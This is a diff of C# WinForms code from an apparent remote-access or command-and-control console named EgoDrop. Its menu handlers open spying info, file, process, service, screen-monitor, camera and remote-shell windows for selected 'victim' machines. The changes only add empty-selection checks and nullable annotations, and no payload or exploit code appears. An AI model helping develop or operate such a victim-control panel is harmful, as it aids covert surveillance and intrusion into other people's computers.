@@ -945,7 +945,14 @@ namespace EgoDrop
         //Info
         private void toolStripMenuItem5_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
+            if (items.Count == 0)
+            {
+                MessageBox.Show("Please select a online machine.", "Nothing is selec");
+                return;
+            }
+
+            foreach (ListViewItem item in items)
             {
                 string szVictimID = fnszGetVictimID(item);
                 frmInfoSpyder f = new frmInfoSpyder(szVictimID, fnGetVictimFromTag(item));
@@ -956,7 +963,14 @@ namespace EgoDrop
         //File
         private void toolStripMenuItem6_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
+            if (items.Count == 0)
+            {
+                MessageBox.Show("Please select a online machine.", "Nothing is selec");
+                return;
+            }
+
+            foreach (ListViewItem item in items)
             {
                 clsAgent agent = fnGetAgentFromTag(item);
                 frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(agent);
@@ -975,7 +989,14 @@ namespace EgoDrop
         //Process
         private void toolStripMenuItem7_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
+            if (items.Count == 0)
+            {
+                MessageBox.Show("Please select a online machine.", "Nothing is selec");
+                return;
+            }
+
+            foreach (ListViewItem item in items)
             {
                 clsAgent agent = fnGetAgentFromTag(item);
 
@@ -995,7 +1016,14 @@ namespace EgoDrop
         //Service
         private void toolStripMenuItem8_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
+            if (items.Count == 0)
+            {
+                MessageBox.Show("Please select a online machine.", "Nothing is selec");
+                return;
+            }
+
+            foreach (ListViewItem item in items)
             {
                 clsAgent agent = fnGetAgentFromTag(item);
 
@@ -1015,7 +1043,14 @@ namespace EgoDrop
         //Monitor
         private void toolStripMenuItem9_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
+            if (items.Count == 0)
+            {
+                MessageBox.Show("Please select a online machine.", "Nothing is selec");
+                return;
+            }
+
+            foreach (ListViewItem item in items)
             {
                 frmMonitor f = new frmMonitor(fnGetVictimFromTag(item));
 
@@ -1026,7 +1061,14 @@ namespace EgoDrop
         //Camera
         private void toolStripMenuItem10_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
+            if (items.Count == 0)
+            {
+                MessageBox.Show("Please select a online machine.", "Nothing is selec");
+                return;
+            }
+
+            foreach (ListViewItem item in items)
             {
                 frmCamera f = new frmCamera();
 
@@ -1036,7 +1078,14 @@ namespace EgoDrop
 
         private void toolStripMenuItem11_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
+            if (items.Count == 0)
+            {
+                MessageBox.Show("Please select a online machine.", "Nothing is selec");
+                return;
+            }
+
+            foreach (ListViewItem item in items)
             {
                 clsAgent agent = fnGetAgentFromTag(item);
                 frmShell f = clsTools.fnFindForm<frmShell>(agent);
@@ -1059,7 +1108,7 @@ namespace EgoDrop
 
         private void toolStripMenuItem13_Click(object sender, EventArgs e)
         {
-            NetworkNode node = networkView1.SelectedNode;
+            NetworkNode? node = networkView1.SelectedNode;
             if (node == null)
                 return;
 
@@ -1094,7 +1143,7 @@ namespace EgoDrop
         {
             if (e.Button == MouseButtons.Right)
             {
-                NetworkNode node = networkView1.SelectedNode;
+                NetworkNode? node = networkView1.SelectedNode;
                 if (node == null)
                     return;
 
@@ -1147,7 +1196,7 @@ namespace EgoDrop
 
         private void toolStripMenuItem16_Click(object sender, EventArgs e)
         {
-            NetworkNode node = networkView1.SelectedNode;
+            NetworkNode? node = networkView1.SelectedNode;
             if (node == null)
                 return;
 
@@ -1185,7 +1234,7 @@ namespace EgoDrop
 
         private void toolStripMenuItem19_Click(object sender, EventArgs e)
         {
-            NetworkNode node = networkView1.SelectedNode;
+            NetworkNode? node = networkView1.SelectedNode;
             if (node == null)
                 return;
 
@@ -1221,7 +1270,7 @@ namespace EgoDrop
 
         private void toolStripMenuItem25_Click(object sender, EventArgs e)
         {
-            NetworkNode node = networkView1.SelectedNode;
+            NetworkNode? node = networkView1.SelectedNode;
             if (node == null)
                 return;
 
@@ -1245,7 +1294,7 @@ namespace EgoDrop
 
         private void toolStripMenuItem27_Click(object sender, EventArgs e)
         {
-            NetworkNode node = networkView1.SelectedNode;
+            NetworkNode? node = networkView1.SelectedNode;
             if (node == null)
                 return;
 
@@ -1253,7 +1302,7 @@ namespace EgoDrop
             if (string.IsNullOrEmpty(szID))
                 return;
 
-            ListViewItem item = listView1.FindItemWithText(szID, true, 0);
+            ListViewItem? item = listView1.FindItemWithText(szID, true, 0);
             if (item == null)
                 return;
 
@@ -1267,7 +1316,7 @@ namespace EgoDrop
 
         private void toolStripMenuItem28_Click(object sender, EventArgs e)
         {
-            NetworkNode node = networkView1.SelectedNode;
+            NetworkNode? node = networkView1.SelectedNode;
             if (node == null)
                 return;
 
@@ -1275,7 +1324,7 @@ namespace EgoDrop
             if (string.IsNullOrEmpty(szID))
                 return;
 
-            ListViewItem item = listView1.FindItemWithText(szID, true, 0);
+            ListViewItem? item = listView1.FindItemWithText(szID, true, 0);
             if (item == null)
                 return;
 
